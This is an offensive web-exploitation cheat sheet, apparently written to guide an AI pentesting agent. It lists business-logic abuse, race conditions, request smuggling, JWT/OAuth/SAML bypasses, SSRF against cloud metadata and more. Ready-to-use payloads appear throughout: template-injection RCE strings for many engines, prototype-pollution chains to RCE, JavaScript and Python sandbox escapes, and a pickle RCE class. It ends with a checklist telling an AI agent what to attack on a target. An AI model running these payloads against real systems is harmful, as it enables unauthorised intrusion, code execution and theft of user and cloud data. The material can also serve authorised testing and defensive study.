# Advanced Web Exploitation 2026 — Techniques AI Agents Consistently MISS

Based on: PortSwigger Top 10 (2025), XBOW AI, ExploitBench, CSA Mythos analysis, 
Hackers or Hallucinators paper, SecurityBoulevard business logic research, and 30+ CVEs from 2025-2026.

---

## 1. BUSINESS LOGIC FLAWS (Scanners are 100% BLIND to these)

### Why AI Misses Them:
- No error/crash signature — app works "as coded" but violates INTENDED rules
- Requires UNDERSTANDING what the app is SUPPOSED to do
- Combinatorial — exploit requires specific SEQUENCE of actions
- No known pattern to match against

### Techniques:

**1.1 Multi-Step Process Manipulation:**
- Skip steps in checkout/registration flow (go directly from step 1 to step 4)
- Repeat steps (apply discount code → complete → apply again on same order)
- Reverse steps (cancel order AFTER refund processed)
- Concurrent steps (apply 2 coupons simultaneously via race condition)

**1.2 Price/Quantity Manipulation:**
- Negative quantity in cart → credit to account
- Zero-price item added → bypass minimum order requirement
- Currency confusion (switch currency mid-transaction)
- Integer overflow on quantity → extremely large discount
- Floating point precision abuse ($0.001 × 1000 items = $1 charged, but system rounds each to $0)

**1.3 Role/Privilege Logic:**
- Self-promote via parameter tampering (role=admin in hidden field)
- Privilege retained after role change (admin demoted but session keeps admin rights)
- Cross-tenant access via IDOR in multi-tenant apps
- Feature flags bypass (disabled feature still accessible via direct URL)

**1.4 Workflow Abuse:**
- Password reset token reuse (token not invalidated after use)
- Email verification bypass (verify email → change to attacker email → still verified)
- Account lockout bypass (reset failed login counter via password reset)
- Referral/bonus abuse (refer yourself via different email)

**1.5 Time-Based Logic:**
- Expired coupon still works if added to cart before expiry
- Trial period extension by changing system time expectations
- Auction sniping via time manipulation
- Subscription downgrade doesn't remove premium features immediately

---

## 2. RACE CONDITIONS (Single-Packet Attack / HTTP/2 Concurrent Streams)

### PortSwigger's "Limit Overrun" Methodology:
```
1. Identify state-changing endpoints (purchase, transfer, vote, redeem)
2. Prepare multiple identical requests
3. Use HTTP/2 single-packet attack or HTTP/1.1 last-byte sync
4. Send N requests simultaneously (within single TCP packet)
5. Check if limit was bypassed (N items created instead of 1)
```

### Attack Scenarios:
- **Payment race**: Buy item → 2 concurrent requests with same payment token → 2 items, 1 charge
- **Coupon race**: Apply same coupon code in parallel → multiple discounts
- **Vote race**: Submit vote multiple times simultaneously → ballot stuffing
- **Transfer race**: Transfer $100 from account with $100 balance → 2 concurrent → $200 transferred
- **Registration race**: Create account with same email simultaneously → duplicate accounts
- **File upload race**: Upload + access simultaneously → read before validation completes (TOCTOU)

### Tools:
- Burp Repeater (group tabs → send parallel)
- Turbo Intruder (race condition mode)
- `curl --parallel` with HTTP/2
- Custom Python with `asyncio` + `aiohttp` for precise timing

### Detection:
- Identify endpoints that: check-then-act, read-then-write, validate-then-execute
- Look for: counters, balances, quotas, one-time tokens, inventory counts
- Response differences between single vs parallel requests = VULNERABLE

---

## 3. ADVANCED SSTI (Top 1 Web Technique 2025 — PortSwigger)

### "Successful Errors" Technique (Vladislav Korchagin — #1 technique 2025):
- Error-based SSTI exploitation for BLIND template injection
- Polyglot detection: `{{7*7}}${7*7}<%=7*7%>#{7*7}{7*7}${{7*7}}`
- Adapted from SQL injection error-based extraction to SSTI context

### CVE-2026-40478 — Thymeleaf Triple Bypass (CVSS 9.1):
```
Bypass 1: Expression detection evasion via Thymeleaf preprocessing
Bypass 2: SpEL keyword scanner evasion via TAB character (0x09)
Bypass 3: ACL blocklist evasion via Jackson + Spring Core classes

Payload pattern:
__${T(com.fasterxml.jackson.databind.ObjectMapper).new...}__
(TAB character between keywords defeats regex scanner)
```

### Modern SSTI Bypasses per Engine:
- **Jinja2**: `{{lipsum.__globals__['os'].popen('id').read()}}` | MRO traversal
- **Twig**: `{{['id']|filter('system')}}` | filter chain bypass
- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- **Pebble**: `{% set cmd='id' %}{% set bytes=cmd.getClass().forName('java.lang.Runtime')... %}`
- **Thymeleaf**: preprocessing `__${...}__` + SpEL via reflection
- **Velocity**: `#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))...`
- **ERB (Ruby)**: `<%= system('id') %>` | `<%= `id` %>`
- **Smarty**: `{system('id')}` | `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php eval...",self::clearConfig())}`

### Blind SSTI Detection:
- Time-based: `{{range(1,10000000)}}` → slow response = Jinja2
- Error-based: Force error in template → error message reveals engine
- DNS/HTTP out-of-band: Template evaluates → triggers external callback

---

## 4. HTTP REQUEST SMUGGLING (2025-2026 State of Art)

### James Kettle's "Desync Endgame" (Black Hat 2025):
- Modern targets BLOCK old detection gadgets (regex on Transfer-Encoding)
- New technique: malformed chunks that bypass regex but confuse parsers
- Race condition in detection = needs high request rate (~100/s)
- H2→H1 downgrade attacks still viable on Nginx, Akamai, CloudFront, Fastly

### CVE-2026-42585 — Netty Request Smuggling:
```
Transfer-Encoding: chunked, identity
Content-Length: 48
→ Netty parses as chunked, proxy uses Content-Length
→ Second request smuggled inside body
```

### Smuggling Variants:
- **CL.TE**: Frontend uses Content-Length, backend uses Transfer-Encoding
- **TE.CL**: Frontend uses Transfer-Encoding, backend uses Content-Length  
- **TE.TE**: Both use TE but parse differently (obfuscated header)
- **H2.CL**: HTTP/2 frontend, HTTP/1 backend with CL mismatch
- **H2.TE**: HTTP/2 to HTTP/1 with TE injection
- **H2C Smuggling**: HTTP/2 cleartext upgrade bypass

### Kill: Use upstream H2 end-to-end. If stuck on H1:
- Scan regularly with HTTP Request Smuggler v3
- Normalize Transfer-Encoding handling
- Reject ambiguous requests

---

## 5. PROTOTYPE POLLUTION → RCE (2025-2026 Chains)

### Server-Side (Node.js) PP → RCE:
```javascript
// Via child_process environment injection:
{"__proto__":{"NODE_OPTIONS":"--require=/tmp/evil.js"}}
// Any subsequent child_process.exec/spawn inherits polluted env

// Via Handlebars AST injection:
{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement",...}]}}

// Via Pug AST injection:
{"__proto__":{"block":{"type":"Text","val":"x]});process.mainModule.require('child_process').exec('id');//"}}}
```

### Client-Side PP → XSS:
- **CVE-2026-41238**: DOMPurify bypass via PP + RegExp injection through postMessage
- jQuery `.extend()` deep merge → pollute innerHTML/srcdoc
- Lodash `_.merge()` / `_.set()` → pollute any property

### Detection:
- Parameter: `?__proto__[test]=polluted` or `?constructor[prototype][test]=polluted`
- JSON body: `{"__proto__":{"polluted":"yes"}}`
- Check: access any object property `test` → if returns "polluted" → PP confirmed
- Tools: ppfuzz 2.0, DOM Invader (Burp), protoStalker

### Gadget Hunting:
- Look for: template compilation, child_process spawn, dynamic property access
- `Object.create(null)` defeats PP — look for objects NOT using this
- Deep merge utilities (lodash, jQuery, custom) = most common source

---

## 6. ADVANCED AUTHENTICATION BYPASS (2025-2026)

### CVE-2026-5521 — OAuth2 Bypass via X-Forwarded-Uri Spoofing:
```
Attack: Spoof X-Forwarded-Uri header → auth layer evaluates wrong path
→ Gateway thinks request is for public endpoint
→ Backend serves protected resource
Condition: --reverse-proxy + --skip-auth-regex/--skip-auth-route
```

### Ghost-Token OAuth Bypass (May 2026):
- Client signs JWT with correct key but wrong `aud` (attacker-controlled metadata)
- Attacker reuses token at honest server → valid signature, wrong audience
- Affects: private_key_jwt clients talking to multiple authorization servers

### JWT Attack Vectors:
- **Algorithm confusion**: RS256→HS256 (use public key as HMAC secret)
- **None algorithm**: `{"alg":"none"}` or `"None"` or `"NONE"` or `"nOnE"`
- **KID injection**: `"kid":"../../etc/passwd"` or `"kid":"x' UNION SELECT 'secret'--"`
- **JKU/X5U SSRF**: Point to attacker-controlled JWKS endpoint
- **Weak secrets**: `jwt-cracker` or `hashcat -m 16500`
- **Embedded JWK**: Self-signed key in header trusted by server

### ConsentFix v3 — OAuth Consent Phishing (silent, no MFA):
- Exploits active browser session → no password prompt, no MFA challenge
- Session reuse: If victim has authenticated Microsoft session → auto-approves
- Zero victim interaction in v3

### SAML Exploitation (new 2025 techniques):
- XML signature wrapping → inject unsigned assertion
- Comment injection in NameID → `admin@evil.com<!--` truncation
- XSLT injection in SAML response → RCE

---

## 7. ADVANCED SSRF (2025-2026)

### Novel SSRF via HTTP Redirect Loops (#3 PortSwigger 2025):
- Blind SSRF → visible through redirect loop chain
- "That's magic" — elegant technique making blind SSRF observable

### Cloud Metadata SSRF Escalation:
```
AWS IMDSv2 bypass:
- X-Forwarded-For header injection to bypass IP restriction
- DNS rebinding: point domain to 169.254.169.254 after first resolution
- Redirect chain: your-server → 302 → http://169.254.169.254/latest/meta-data/

GCP: http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### SSRF via Unexpected Sinks:
- PDF generation (wkhtmltopdf, Puppeteer) — inject `<iframe src="http://internal/">`
- Image processing (ImageMagick, SVG) — `<image xlink:href="http://internal/"`
- Webhook/callback URLs — point to internal services
- XML external entities (XXE) — `<!ENTITY x SYSTEM "http://internal/">`
- Import/export features — CSV with `=IMPORTDATA("http://internal/")`
- Font loading — `@font-face { src: url('http://internal/') }`

### DNS Rebinding for SSRF:
1. Victim resolves attacker.com → gets attacker IP (passes allowlist check)
2. Attacker changes DNS to 127.0.0.1 or internal IP
3. When app makes second request (follows redirect/retries) → hits internal

---

## 8. ORM LEAKING (#2 PortSwigger 2025)

### Concept: SQL injection fading → ORM Leaks rising
- Generic methodology for exploiting search/filtering capabilities
- Works through ORM query builders (Sequelize, Prisma, Django ORM, SQLAlchemy)
- Dump database WITHOUT classic SQL injection

### Techniques:
- Filter parameter manipulation: `?filter[email][$regex]=^a` → boolean oracle
- Nested relation traversal: `?include=user.password` or `?populate=secrets`
- Sorting oracle: `?sort=password` → alphabetical ordering reveals values
- Aggregation abuse: `?aggregate[count][field]=ssn&group_by=ssn`
- Computed column injection via ORM-specific operators

### Detection:
- Any API with filter/search/sort parameters → test ORM operators
- Framework-specific: `$gt`, `$lt`, `$regex`, `$ne` (MongoDB/Mongoose)
- `[gte]`, `[lte]`, `[like]` (Sequelize)
- `__contains`, `__startswith`, `__regex` (Django)

---

## 9. WEB CACHE POISONING & DECEPTION

### Next.js Internal Cache Poisoning (#7 PortSwigger 2025):
- Internal caches harder to detect than CDN caches
- Poison internal cache → affects ALL users, not just CDN edge
- Source code analysis required to find cache key vs non-key inputs

### Cache Deception (2025-2026):
```
Attack: /account/settings/nonexistent.css
→ CDN caches response (thinks it's static CSS because of .css extension)
→ Response actually contains user's account data (path normalization difference)
→ Attacker accesses same URL → gets victim's cached data

Variants:
- Path confusion: /api/user/profile%2F..%2F../static/cached.js
- Delimiter confusion: /account;.css or /account%00.css
- Encoding: /account%2e.css
```

### Poisoning via Unkeyed Headers:
- `X-Forwarded-Host` → inject attacker domain in cached response
- `X-Original-URL` / `X-Rewrite-URL` → path override
- `X-Forwarded-Scheme: http` → force redirect to HTTP (cached)
- Custom headers from CDN (X-Amzn-*, X-Cache-*)

---

## 10. PARSER DIFFERENTIALS (#10 PortSwigger 2025)

### Concept: Different components parse same input differently
- Frontend/Backend path parsing: `/admin/../public` → FE sees `/public`, BE sees `/admin`
- URL parser differences: `http://evil.com\@good.com` → some parsers see evil.com as host
- JSON parser: duplicate keys → first wins vs last wins = different behavior per component
- XML parser: entity expansion, encoding differences

### Exploitation Patterns:
- **Auth bypass**: Path normalization between proxy and app
  - Proxy: `/api/public/../admin/users` → normalizes to `/api/admin/users` → BLOCKS
  - App: receives raw `/api/public/../admin/users` → processes as public first → ALLOWS
  
- **WAF bypass**: WAF and app parse payload differently
  - WAF sees: `{"user":"admin"}` (first key wins)
  - App sees: `{"user":"normal","user":"admin"}` (last key wins)
  
- **SSRF**: URL parser differences
  - Allowlist check: `http://trusted.com@evil.com` → sees trusted.com as userinfo
  - HTTP library: `http://trusted.com@evil.com` → connects to evil.com

---

## 11. SANDBOX ESCAPES (2025-2026)

### CVE-2026-1470 & CVE-2026-0863 — n8n JS/Python Sandbox Escape:
- JS: AST sanitization bypass → RCE
- Python: `cr_frame.f_builtins` recovery from coroutine → `__import__('os')`
- Pattern: denied builtins recoverable through live function objects

### General JS Sandbox Escape Patterns:
```javascript
// Recover builtins from Error stack:
try { null.f() } catch(e) { e.constructor.constructor('return process')().exit() }

// Via arguments.callee:
(function(){return arguments.callee.caller.constructor('return process')()})()

// Via Proxy:
new Proxy({}, {get: (t,p,r) => Reflect.get(t,p,r).__proto__.constructor.constructor('return this')()})

// Via Symbol.toPrimitive:
({[Symbol.toPrimitive](){return this.constructor.constructor('return process')()}}) + ''
```

### Python Sandbox Escapes:
```python
# Via subclasses:
''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('id')

# Via builtins from frame:
(lambda: 0).__code__.co_consts  # traverse to find builtins

# Via exception:
try: raise Exception()
except Exception as e: e.__traceback__.tb_frame.f_globals['__builtins__']['__import__']('os').system('id')
```

---

## 12. SIDE-CHANNEL / XS-LEAK ATTACKS (Rising trend 2025)

### Cross-Site ETag Length Leak (#6 PortSwigger 2025):
- Leak response size cross-domain via ETag behavior
- Browser connection-pool prioritization as oracle (#8)

### Practical XS-Leak Patterns:
- **Timing oracle**: Response time difference reveals data existence
- **Frame counting**: `window.length` after navigation reveals page content type
- **Error events**: `<img onerror>` / `<script onerror>` → resource type detection
- **Cache timing**: Pre-cache → check timing → determine if user visited specific URL
- **Connection pool**: Saturate connection pool → measure new connection delay

### Use Cases:
- Detect if user is logged in to specific service
- Determine user's email domain
- Extract CSRF tokens character by character
- Deanonymize users across sites

---

## 13. DESERIALIZATION (2025-2026 State)

### Java Gadget Chains (current top chains):
- **Commons-Beanutils (CB1)**: PropertyUtils → TemplatesImpl → RCE
- **Commons-Collections (CC6/CC7)**: TiedMapEntry → LazyMap → ChainedTransformer
- **ROME**: ToStringBean → JdbcRowSetImpl → JNDI
- **Spring**: MethodInvokeTypeProvider → TemplatesImpl
- **Jackson**: polymorphic deserialization → JNDI/SSRF/RCE

### PHP POP Chains:
- Laravel: PendingBroadcast → Dispatcher → eval
- Symfony: FnStream → Stream wrapper → file operations
- WordPress: Requests_Utility_FilteredIterator → callback execution

### Python Pickle RCE:
```python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Exploit())
```

### .NET ViewState Deserialization:
- If machineKey is known/leaked → forge malicious ViewState
- Tools: ysoserial.net, ViewGen
- Gadget: TypeConfuseDelegate → Process.Start

---

## 14. SECOND-ORDER VULNERABILITIES (AI Almost Never Finds These)

### Concept: Payload stored now, executed LATER in different context

**Second-Order SQLi:**
- Register username: `admin'--`
- Login → app constructs query: `WHERE username='admin'--'` → auth bypass
- Stored in DB, triggered when admin views user list

**Second-Order XSS:**
- Submit comment with XSS payload → stored
- Admin views comment in different context (admin panel without sanitization)
- Payload fires in admin context → steal admin session

**Second-Order SSRF:**
- Upload profile image URL (not fetched immediately)
- Background job fetches URL later → SSRF from internal network context

**Second-Order Command Injection:**
- Set filename to `$(whoami).txt`
- Background cron job processes file → command executes in cron context

### Detection Strategy:
- Identify all data STORAGE points (DB write, file write, queue push)
- Trace where stored data is CONSUMED later
- Test: does the consumption context have different trust/sanitization?

---

## 15. HTTP/2 SPECIFIC ATTACKS

### CONTINUATION Frame Flood (2025):
- Send headers split across many CONTINUATION frames
- Server must buffer ALL before processing → memory exhaustion DoS
- Bypass request size limits

### H2C Smuggling:
```
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
Connection: Upgrade, HTTP2-Settings

→ If proxy forwards upgrade without understanding H2C:
→ Attacker gets raw TCP connection to backend
→ Bypasses all proxy-level security
```

### HTTP/2 CONNECT Abuse (#9 PortSwigger 2025):
- Internal port scanning via H2 CONNECT
- Proxy CONNECT requests to internal services
- Bypass firewall rules that only filter HTTP/1

---

## OPERATIONAL INTEGRATION

### When Testing a Web Target, CHECK ALL OF THESE:
1. Business logic → multi-step manipulation, race conditions, price/role abuse
2. Template injection → polyglot detection, error-based blind SSTI
3. Request smuggling → CL.TE, TE.CL, H2.CL, malformed chunks
4. Prototype pollution → `__proto__` in params/JSON, gadget chain to RCE
5. Auth bypass → JWT manipulation, OAuth flow abuse, SAML wrapping
6. SSRF → PDF/image/webhook/XML sinks, DNS rebinding, redirect chains
7. ORM leaking → filter/sort/search params with framework operators
8. Cache poisoning → unkeyed headers, path confusion, internal caches
9. Parser differentials → path normalization, URL parsing, JSON duplicates
10. Sandbox escape → JS/Python builtins recovery, frame traversal
11. XS-Leaks → timing, frame counting, connection pool, ETag
12. Deserialization → Java/PHP/Python/NET gadget chains
13. Second-order → stored payload triggered in different context
14. HTTP/2 attacks → CONTINUATION, H2C smuggling, CONNECT
15. Race conditions → single-packet attack on state-changing endpoints

### Priority for AI Agent (techniques most likely to be MISSED):
1. Business logic (100% miss rate by scanners)
2. Race conditions (timing-dependent, often missed)
3. Second-order vulns (requires temporal reasoning)
4. ORM leaking (new class, not in scanner signatures)
5. Parser differentials (requires understanding multiple parsers)
